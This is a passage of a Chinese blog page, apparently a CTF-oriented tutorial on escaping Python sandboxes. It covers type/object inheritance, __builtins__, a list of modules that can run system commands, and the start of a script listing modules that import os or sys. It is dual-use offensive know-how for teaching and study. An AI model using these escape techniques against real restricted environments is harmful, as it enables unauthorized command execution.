@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在。">
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        python沙盒逃逸:从头开始 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/" />
+        </div>
+        <div class="name">
+            <i>Luc1fer</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Python-沙箱逃逸你真的看懂了么？"><span class="toc-text">Python 沙箱逃逸你真的看懂了么？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#type-amp-object"><span class="toc-text">type &amp; object</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#builtin、builtins、builtins-是什么？"><span class="toc-text">builtin、builtins、builtins 是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-有哪些可以执行系统命令呢？"><span class="toc-text">Python 有哪些可以执行系统命令呢？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#如果我们没办法-import-呢？"><span class="toc-text">如果我们没办法 import 呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他一些小技巧"><span class="toc-text">其他一些小技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通过继承关系逃逸"><span class="toc-text">通过继承关系逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#大佬们的payload"><span class="toc-text">大佬们的payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤中括号"><span class="toc-text">过滤中括号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤引号"><span class="toc-text">过滤引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤双下划线"><span class="toc-text">过滤双下划线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤关键字"><span class="toc-text">过滤关键字</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用函数"><span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        python沙盒逃逸:从头开始
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-10-11 14:26:44</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#php" title="php">php</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <p>10/11/2019 2:26:44 PM </p>
+<h1 id="Python-沙箱逃逸你真的看懂了么？"><a href="#Python-沙箱逃逸你真的看懂了么？" class="headerlink" title="Python 沙箱逃逸你真的看懂了么？"></a>Python 沙箱逃逸你真的看懂了么？</h1><p>python 沙箱逃逸就是在一个被严格限制了 python 执行环境中获取更高的权限，甚至 getshell ,这是我们的最终目的。但是在这之前我们需要绕过各种限制。</p>
+<p>由于环境中限制了许多敏感模块比如 os 、 sys ，于是我们的重点变成了如何绕过限制去引入能执行我们想要的操作的模块。</p>
+<p>接下来让我们先了解一下 python 的两个非常重要的东西</p>
+<h2 id="type-amp-object"><a href="#type-amp-object" class="headerlink" title="type &amp; object"></a>type &amp; object</h2><p>在 python 里要查看一个类型的父类，使用它的 <strong>base</strong> 属性查看。  在 python 里查看一个实例的类型，使用它的 <strong>class</strong> 属性可以查看，或者使用 type() 函数查看。</p>
+<pre><code>&gt;&gt;&gt; object
+&lt;type &apos;object&apos;&gt;
+&gt;&gt;&gt; type
+&lt;type &apos;type&apos;&gt;</code></pre><p>他们都是 type 的一个实例，表示他们都是类型对象。</p>
+<p>Python 中， object 是父子关系的顶端，所有数据类型的父类都是它； type 是类型实例关系的顶端，所有对象都是它的实例，他们的关系可以描述为: object 是一个 type (object is a instance of type)，即 Object 是 type 的一个实例。</p>
+<pre><code>&gt;&gt;&gt; object.__class__
+&lt;type &apos;type&apos;&gt;
+
+&gt;&gt;&gt; object.__bases__  #站在食物链顶端的男人，没有父类
+()
+
+&gt;&gt;&gt; type.__bases__
+(&lt;type &apos;object&apos;&gt;,)
+&gt;&gt;&gt; type.__class__    #type 的类型是自己
+&lt;type &apos;type&apos;&gt;</code></pre><p>我们再尝试引入一些内置数据类型来看看：</p>
+<pre><code>&gt;&gt;&gt; list.__bases__
+(&lt;type &apos;object&apos;&gt;,)
+&gt;&gt;&gt; type.__class__
+&lt;type &apos;type&apos;&gt;
+&gt;&gt;&gt; dict.__bases__
+(&lt;type &apos;object&apos;&gt;,)
+&gt;&gt;&gt; dict.__class__
+&lt;type &apos;type&apos;&gt;</code></pre><p><strong>他们的父类都是 object , 类型都是 type</strong>，这点很重要！</p>
+<p>我们把他们放在一个表里看看：</p>
+<p><img src="https://pic2.zhimg.com/80/dcfa446418490a973b8dd47e83c181a8_hd.jpg" alt></p>
+<p>白板上的虚线表示源是目标的实例，实线表示源是目标的子类。即，左边的是右边的类型，而上面的是下面的父亲。</p>
+<h2 id="builtin、builtins、builtins-是什么？"><a href="#builtin、builtins、builtins-是什么？" class="headerlink" title="builtin、builtins、builtins 是什么？"></a><strong>builtin</strong>、<strong>builtins</strong>、builtins 是什么？</h2><p>python 中有一个内建模块，该模块中有一些常用函数；而该模块在 Python 启动之后、且没有执行任何代码之前，python 会首先加载该内建函数到内存中。另外，该内建函数中的功能可以直接使用不需要添加任何内建模块前缀，其原因是对函数、变量、类等标识符的查找是按照 LE(N)GB 的规则</p>
+<pre><code>locals -&gt; enclosing function -&gt; globals -&gt; builtins</code></pre><p>在 Python2.x 版本中，内建模块被命为 <code>__builtin__</code> , 而到了 Python3.x 版本更名为 <code>builtins</code> .</p>
+<p>当使用内建模块中函数或其它功能时，可以直接使用，不用添加内建模块的名字;但是，如果想要向内建模块中添加一些功能，以便在任何函数中都能直接使用而不 用再进行import，这时，就要导入内建模块，在内建模块的命名空间(即 <strong>dict</strong> 字典属性)中添加该功能。在导入时，如果是 Python2.X 版本，就要导入 <code>__builtin__</code> 模块;如果是 Python3.X版本，就要导入builtins 模块。如：在 Python2.X 中，向内建模块添加 一个函数(该函数打印 “hello, world” )，可以这样写</p>
+<pre><code>&gt;&gt;&gt; import __builtin__
+&gt;&gt;&gt; def print_hello():
+...     print &quot;hello world!&quot;
+...
+&gt;&gt;&gt; __builtin__.__dict__[&apos;hello&apos;]=print_hello
+&gt;&gt;&gt; print_hello()
+hello world!
+&gt;&gt;&gt; hello()
+hello world!</code></pre><p>此时， <code>print_hello</code> 和 <code>hello</code> 两个函数名几乎是一样，但是有一点区别，<code>print_hello</code>只能在该模块中使用，而 <code>hello</code> 可以在本程序中的其它任何一个模块中使用，因为 <code>hello</code> 已经放到内建模块中了。</p>
+<p>说完了 <code>__builtin__</code> 和 <code>builtin</code> ,那 <code>__builtins__</code> 是什么？</p>
+<p><code>__builtins__</code> 即是引用，也是在代码运行之前被加载到内存中。但是它们还有一点区别：</p>
+<ol>
+<li>无论任何地方要想使用内建模块，都必须在该位置所处的作用域中导入 <code>__builtin__</code> 内建模块;而对于 <code>__builtins__</code> 却不用导入，它在任何模块都直接可见</li>
+<li>在主模块 <code>__main__</code> 中 <code>__builtins__</code> 是对内建模块 <code>__builtin__</code> 本身的引用，即 <code>__builtins__</code> 完全等价于 <code>__builtin__</code> ，二者完全是一个东西，不分彼此；在非主模块中 <code>__builtins__</code> 仅是对 <code>__builtin__</code> . <code>__dict__</code> 的引用，而非<code>__builtin__</code> 本身。它在任何地方都可见。此时 <code>__builtins__</code> 的类型是字典。</li>
+</ol>
+<p>我们打开 IDLE 看看这里面都有什么东西吧(Python 2.7)。</p>
+<pre><code>&gt;&gt;&gt; dir(__builtins__)
+[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;WindowsError&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</code></pre><p>我们看到了常用的 <code>__import__</code> 、 <code>bin</code> 、 <code>eval</code> 等命令</p>
+<p>好了，现在我们已经大致上知道了各个模块之间的关系了！</p>
+<h2 id="Python-有哪些可以执行系统命令呢？"><a href="#Python-有哪些可以执行系统命令呢？" class="headerlink" title="Python 有哪些可以执行系统命令呢？"></a>Python 有哪些可以执行系统命令呢？</h2><p>os  commands  subprocess  timeit  platform  pty …</p>
+<p>搬运一个测试所有导入 os 或者 sys 的库的脚本：</p>
+<pre><code>#-*- coding:utf8 -*-
+# By Macr0phag3
+# in 2019-05-07 19:46:12
+# ------------------------------------
+
+# this, antigravity 库删掉
+all_modules_2 = [
+    &apos;BaseHTTPServer&apos;, &apos;imaplib&apos;, &apos;shelve&apos;, &apos;Bastion&apos;, &apos;anydbm&apos;, &apos;imghdr&apos;, &apos;shlex&apos;, &apos;CDROM&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;shutil&apos;, &apos;CGIHTTPServer&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;signal&apos;, &apos;Canvas&apos;, &apos;ast&apos;, &apos;imputil&apos;, &apos;site&apos;, &apos;ConfigParser&apos;, &apos;asynchat&apos;, &apos;inspect&apos;, &apos;sitecustomize&apos;, &apos;Cookie&apos;, &apos;asyncore&apos;, &apos;io&apos;, &apos;smtpd&apos;, &apos;DLFCN&apos;, &apos;atexit&apos;, &apos;itertools&apos;, &apos;smtplib&apos;, &apos;Dialog&apos;, &apos;audiodev&apos;, &apos;json&apos;, &apos;sndhdr&apos;, &apos;DocXMLRPCServer&apos;, &apos;audioop&apos;, &apos;keyword&apos;, &apos;socket&apos;, &apos;FileDialog&apos;, &apos;base64&apos;, &apos;lib2to3&apos;, &apos;spwd&apos;, &apos;FixTk&apos;, &apos;bdb&apos;, &apos;linecache&apos;, &apos;sqlite3&apos;, &apos;HTMLParser&apos;, &apos;binascii&apos;, &apos;linuxaudiodev&apos;, &apos;sre&apos;, &apos;IN&apos;, &apos;binhex&apos;, &apos;locale&apos;, &apos;sre_compile&apos;, &apos;MimeWriter&apos;, &apos;bisect&apos;, &apos;logging&apos;, &apos;sre_constants&apos;, &apos;Queue&apos;, &apos;bsddb&apos;, &apos;lsb_release&apos;, &apos;sre_parse&apos;, &apos;ScrolledText&apos;, &apos;bz2&apos;, &apos;macpath&apos;, &apos;ssl&apos;, &apos;SimpleDialog&apos;, &apos;cPickle&apos;, &apos;macurl2path&apos;, &apos;stat&apos;, &apos;SimpleHTTPServer&apos;, &apos;cProfile&apos;, &apos;mailbox&apos;, &apos;statvfs&apos;, &apos;SimpleXMLRPCServer&apos;, &apos;cStringIO&apos;, &apos;mailcap&apos;, &apos;string&apos;, &apos;SocketServer&apos;, &apos;calendar&apos;, &apos;markupbase&apos;, &apos;stringold&apos;, &apos;StringIO&apos;, &apos;cgi&apos;, &apos;marshal&apos;, &apos;stringprep&apos;, &apos;TYPES&apos;, &apos;cgitb&apos;, &apos;math&apos;, &apos;strop&apos;, &apos;Tix&apos;, &apos;chunk&apos;, &apos;md5&apos;, &apos;struct&apos;, &apos;Tkconstants&apos;, &apos;cmath&apos;, &apos;mhlib&apos;, &apos;subprocess&apos;, &apos;Tkdnd&apos;, &apos;cmd&apos;, &apos;mimetools&apos;, &apos;sunau&apos;, &apos;Tkinter&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;sunaudio&apos;, &apos;UserDict&apos;, &apos;codecs&apos;, &apos;mimify&apos;, &apos;symbol&apos;, &apos;UserList&apos;, &apos;codeop&apos;, &apos;mmap&apos;, &apos;symtable&apos;, &apos;UserString&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sys&apos;, &apos;_LWPCookieJar&apos;, &apos;colorsys&apos;, &apos;multifile&apos;, &apos;sysconfig&apos;, &apos;_MozillaCookieJar&apos;, &apos;commands&apos;, &apos;multiprocessing&apos;, &apos;syslog&apos;, &apos;__builtin__&apos;, &apos;compileall&apos;, &apos;mutex&apos;, &apos;tabnanny&apos;, &apos;__future__&apos;, &apos;compiler&apos;, &apos;netrc&apos;, &apos;talloc&apos;, &apos;_abcoll&apos;, &apos;contextlib&apos;, &apos;new&apos;, &apos;tarfile&apos;, &apos;_ast&apos;, &apos;cookielib&apos;, &apos;nis&apos;, &apos;telnetlib&apos;, &apos;_bisect&apos;, &apos;copy&apos;, &apos;nntplib&apos;, &apos;tempfile&apos;, &apos;_bsddb&apos;, &apos;copy_reg&apos;, &apos;ntpath&apos;, &apos;termios&apos;, &apos;_codecs&apos;, &apos;crypt&apos;, &apos;nturl2path&apos;, &apos;test&apos;, &apos;_codecs_cn&apos;, &apos;csv&apos;, &apos;numbers&apos;, &apos;textwrap&apos;, &apos;_codecs_hk&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;_codecs_iso2022&apos;, &apos;curses&apos;, &apos;operator&apos;, &apos;thread&apos;, &apos;_codecs_jp&apos;, &apos;datetime&apos;, &apos;optparse&apos;, &apos;threading&apos;, &apos;_codecs_kr&apos;, &apos;dbhash&apos;, &apos;os&apos;, &apos;time&apos;, &apos;_codecs_tw&apos;, &apos;dbm&apos;, &apos;os2emxpath&apos;, &apos;timeit&apos;, &apos;_collections&apos;, &apos;decimal&apos;, &apos;ossaudiodev&apos;, &apos;tkColorChooser&apos;, &apos;_csv&apos;, &apos;difflib&apos;, &apos;parser&apos;, &apos;tkCommonDialog&apos;, &apos;_ctypes&apos;, &apos;dircache&apos;, &apos;pdb&apos;, &apos;tkFileDialog&apos;, &apos;_ctypes_test&apos;, &apos;dis&apos;, &apos;pickle&apos;, &apos;tkFont&apos;, &apos;_curses&apos;, &apos;distutils&apos;, &apos;pickletools&apos;, &apos;tkMessageBox&apos;, &apos;_curses_panel&apos;, &apos;doctest&apos;, &apos;pipes&apos;, &apos;tkSimpleDialog&apos;, &apos;_elementtree&apos;, &apos;dumbdbm&apos;, &apos;pkgutil&apos;, &apos;toaiff&apos;, &apos;_functools&apos;, &apos;dummy_thread&apos;, &apos;platform&apos;, &apos;token&apos;, &apos;_hashlib&apos;, &apos;dummy_threading&apos;, &apos;plistlib&apos;, &apos;tokenize&apos;, &apos;_heapq&apos;, &apos;email&apos;, &apos;popen2&apos;, &apos;trace&apos;, &apos;_hotshot&apos;, &apos;encodings&apos;, &apos;poplib&apos;, &apos;traceback&apos;, &apos;_io&apos;, &apos;ensurepip&apos;, &apos;posix&apos;, &apos;ttk&apos;, &apos;_json&apos;, &apos;errno&apos;, &apos;posixfile&apos;, &apos;tty&apos;, &apos;_locale&apos;, &apos;exceptions&apos;, &apos;posixpath&apos;, &apos;turtle&apos;, &apos;_lsprof&apos;, &apos;fcntl&apos;, &apos;pprint&apos;, &apos;types&apos;, &apos;_md5&apos;, &apos;filecmp&apos;, &apos;profile&apos;, &apos;unicodedata&apos;, &apos;_multibytecodec&apos;, &apos;fileinput&apos;, &apos;pstats&apos;, &apos;unittest&apos;, &apos;_multiprocessing&apos;, &apos;fnmatch&apos;, &apos;pty&apos;, &apos;urllib&apos;, &apos;_osx_support&apos;, &apos;formatter&apos;, &apos;pwd&apos;, &apos;urllib2&apos;, &apos;_pyio&apos;, &apos;fpformat&apos;, &apos;py_compile&apos;, &apos;urlparse&apos;, &apos;_random&apos;, &apos;fractions&apos;, &apos;pyclbr&apos;, &apos;user&apos;, &apos;_sha&apos;, &apos;ftplib&apos;, &apos;pydoc&apos;, &apos;uu&apos;, &apos;_sha256&apos;, &apos;functools&apos;, &apos;pydoc_data&apos;, &apos;uuid&apos;, &apos;_sha512&apos;, &apos;future_builtins&apos;, &apos;pyexpat&apos;, &apos;warnings&apos;, &apos;_socket&apos;, &apos;gc&apos;, &apos;quopri&apos;, &apos;wave&apos;, &apos;_sqlite3&apos;, &apos;genericpath&apos;, &apos;random&apos;, &apos;weakref&apos;, &apos;_sre&apos;, &apos;getopt&apos;, &apos;re&apos;, &apos;webbrowser&apos;, &apos;_ssl&apos;, &apos;getpass&apos;, &apos;readline&apos;, &apos;whichdb&apos;, &apos;_strptime&apos;, &apos;gettext&apos;, &apos;repr&apos;, &apos;wsgiref&apos;, &apos;_struct&apos;, &apos;glob&apos;, &apos;resource&apos;, &apos;xdrlib&apos;, &apos;_symtable&apos;, &apos;grp&apos;, &apos;rexec&apos;, &apos;xml&apos;, &apos;_sysconfigdata&apos;, &apos;gzip&apos;, &apos;rfc822&apos;, &apos;xmllib&apos;, &apos;_sysconfigdata_nd&apos;, &apos;hashlib&apos;, &apos;rlcompleter&apos;, &apos;xmlrpclib&apos;, &apos;_testcapi&apos;, &apos;heapq&apos;, &apos;robotparser&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;hmac&apos;, &apos;runpy&apos;, &apos;zipfile&apos;, &apos;_warnings&apos;, &apos;hotshot&apos;, &apos;sched&apos;, &apos;zipimport&apos;, &apos;_weakref&apos;, &apos;htmlentitydefs&apos;, &apos;select&apos;, &apos;zlib&apos;, &apos;_weakrefset&apos;, &apos;htmllib&apos;, &apos;sets&apos;, &apos;abc&apos;, &apos;httplib&apos;, &apos;sgmllib&apos;, &apos;aifc&apos;, &apos;ihooks&apos;, &apos;sha&apos;
+]
+
+all_modules_3 = [
+    &apos;AptUrl&apos;, &apos;hmac&apos;, &apos;requests_unixsocket&apos;, &apos;CommandNotFound&apos;, &apos;apport&apos;, &apos;hpmudext&apos;, &apos;resource&apos;, &apos;Crypto&apos;, &apos;apport_python_hook&apos;, &apos;html&apos;, &apos;rlcompleter&apos;, &apos;DistUpgrade&apos;, &apos;apt&apos;, &apos;http&apos;, &apos;runpy&apos;, &apos;HweSupportStatus&apos;, &apos;apt_inst&apos;, &apos;httplib2&apos;, &apos;scanext&apos;, &apos;LanguageSelector&apos;, &apos;apt_pkg&apos;, &apos;idna&apos;, &apos;sched&apos;, &apos;NvidiaDetector&apos;, &apos;aptdaemon&apos;, &apos;imaplib&apos;, &apos;secrets&apos;, &apos;PIL&apos;, &apos;aptsources&apos;, &apos;imghdr&apos;, &apos;secretstorage&apos;, &apos;Quirks&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;select&apos;, &apos;UbuntuDrivers&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;selectors&apos;, &apos;UbuntuSystemService&apos;, &apos;asn1crypto&apos;, &apos;inspect&apos;, &apos;shelve&apos;, &apos;UpdateManager&apos;, &apos;ast&apos;, &apos;io&apos;, &apos;shlex&apos;, &apos;__future__&apos;, &apos;asynchat&apos;, &apos;ipaddress&apos;, &apos;shutil&apos;, &apos;_ast&apos;, &apos;asyncio&apos;, &apos;itertools&apos;, &apos;signal&apos;, &apos;_asyncio&apos;, &apos;asyncore&apos;, &apos;janitor&apos;, &apos;simplejson&apos;, &apos;_bisect&apos;, &apos;atexit&apos;, &apos;json&apos;, &apos;site&apos;, &apos;_blake2&apos;, &apos;audioop&apos;, &apos;keyring&apos;, &apos;sitecustomize&apos;, &apos;_bootlocale&apos;, &apos;base64&apos;, &apos;keyword&apos;, &apos;six&apos;, &apos;_bz2&apos;, &apos;bdb&apos;, &apos;language_support_pkgs&apos;, &apos;smtpd&apos;, &apos;_cffi_backend&apos;, &apos;binascii&apos;, &apos;launchpadlib&apos;, &apos;smtplib&apos;, &apos;_codecs&apos;, &apos;binhex&apos;, &apos;linecache&apos;, &apos;sndhdr&apos;, &apos;_codecs_cn&apos;, &apos;bisect&apos;, &apos;locale&apos;, &apos;socket&apos;, &apos;_codecs_hk&apos;, &apos;brlapi&apos;, &apos;logging&apos;, &apos;socketserver&apos;, &apos;_codecs_iso2022&apos;, &apos;builtins&apos;, &apos;louis&apos;, &apos;softwareproperties&apos;, &apos;_codecs_jp&apos;, &apos;bz2&apos;, &apos;lsb_release&apos;, &apos;speechd&apos;, &apos;_codecs_kr&apos;, &apos;cProfile&apos;, &apos;lzma&apos;, &apos;speechd_config&apos;, &apos;_codecs_tw&apos;, &apos;cairo&apos;, &apos;macaroonbakery&apos;, &apos;spwd&apos;, &apos;_collections&apos;, &apos;calendar&apos;, &apos;macpath&apos;, &apos;sqlite3&apos;, &apos;_collections_abc&apos;, &apos;certifi&apos;, &apos;macurl2path&apos;, &apos;sre_compile&apos;, &apos;_compat_pickle&apos;, &apos;cgi&apos;, &apos;mailbox&apos;, &apos;sre_constants&apos;, &apos;_compression&apos;, &apos;cgitb&apos;, &apos;mailcap&apos;, &apos;sre_parse&apos;, &apos;_crypt&apos;, &apos;chardet&apos;, &apos;mako&apos;, &apos;ssl&apos;, &apos;_csv&apos;, &apos;chunk&apos;, &apos;markupsafe&apos;, &apos;stat&apos;, &apos;_ctypes&apos;, &apos;cmath&apos;, &apos;marshal&apos;, &apos;statistics&apos;, &apos;_ctypes_test&apos;, &apos;cmd&apos;, &apos;math&apos;, &apos;string&apos;, &apos;_curses&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;stringprep&apos;, &apos;_curses_panel&apos;, &apos;codecs&apos;, &apos;mmap&apos;, &apos;struct&apos;, &apos;_datetime&apos;, &apos;codeop&apos;, &apos;modual_test&apos;, &apos;subprocess&apos;, &apos;_dbm&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sunau&apos;, &apos;_dbus_bindings&apos;, &apos;colorsys&apos;, &apos;multiprocessing&apos;, &apos;symbol&apos;, &apos;_dbus_glib_bindings&apos;, &apos;compileall&apos;, &apos;nacl&apos;, &apos;symtable&apos;, &apos;_decimal&apos;, &apos;concurrent&apos;, &apos;netrc&apos;, &apos;sys&apos;, &apos;_dummy_thread&apos;, &apos;configparser&apos;, &apos;nis&apos;, &apos;sysconfig&apos;, &apos;_elementtree&apos;, &apos;contextlib&apos;, &apos;nntplib&apos;, &apos;syslog&apos;, &apos;_functools&apos;, &apos;copy&apos;, &apos;ntpath&apos;, &apos;systemd&apos;, &apos;_gdbm&apos;, &apos;copyreg&apos;, &apos;nturl2path&apos;, &apos;tabnanny&apos;, &apos;_hashlib&apos;, &apos;crypt&apos;, &apos;numbers&apos;, &apos;tarfile&apos;, &apos;_heapq&apos;, &apos;cryptography&apos;, &apos;oauth&apos;, &apos;telnetlib&apos;, &apos;_imp&apos;, &apos;csv&apos;, &apos;olefile&apos;, &apos;tempfile&apos;, &apos;_io&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;termios&apos;, &apos;_json&apos;, &apos;cups&apos;, &apos;operator&apos;, &apos;test&apos;, &apos;_locale&apos;, &apos;cupsext&apos;, &apos;optparse&apos;, &apos;textwrap&apos;, &apos;_lsprof&apos;, &apos;cupshelpers&apos;, &apos;orca&apos;, &apos;_lzma&apos;, &apos;curses&apos;, &apos;os&apos;, &apos;threading&apos;, &apos;_markupbase&apos;, &apos;datetime&apos;, &apos;ossaudiodev&apos;, &apos;time&apos;, &apos;_md5&apos;, &apos;dbm&apos;, &apos;parser&apos;, &apos;timeit&apos;, &apos;_multibytecodec&apos;, &apos;dbus&apos;, &apos;pathlib&apos;, &apos;token&apos;, &apos;_multiprocessing&apos;, &apos;deb822&apos;, &apos;pcardext&apos;, &apos;tokenize&apos;, &apos;_opcode&apos;, &apos;debconf&apos;, &apos;pdb&apos;, &apos;trace&apos;, &apos;_operator&apos;, &apos;debian&apos;, &apos;pexpect&apos;, &apos;traceback&apos;, &apos;_osx_support&apos;, &apos;debian_bundle&apos;, &apos;pickle&apos;, &apos;tracemalloc&apos;, &apos;_pickle&apos;, &apos;decimal&apos;, &apos;pickletools&apos;, &apos;tty&apos;, &apos;_posixsubprocess&apos;, &apos;defer&apos;, &apos;pipes&apos;, &apos;turtle&apos;, &apos;_pydecimal&apos;, &apos;difflib&apos;, &apos;pkg_resources&apos;, &apos;types&apos;, &apos;_pyio&apos;, &apos;dis&apos;, &apos;pkgutil&apos;, &apos;typing&apos;, &apos;_random&apos;, &apos;distro_info&apos;, &apos;platform&apos;, &apos;ufw&apos;, &apos;_sha1&apos;, &apos;distro_info_test&apos;, &apos;plistlib&apos;, &apos;unicodedata&apos;, &apos;_sha256&apos;, &apos;distutils&apos;, &apos;poplib&apos;, &apos;unittest&apos;, &apos;_sha3&apos;, 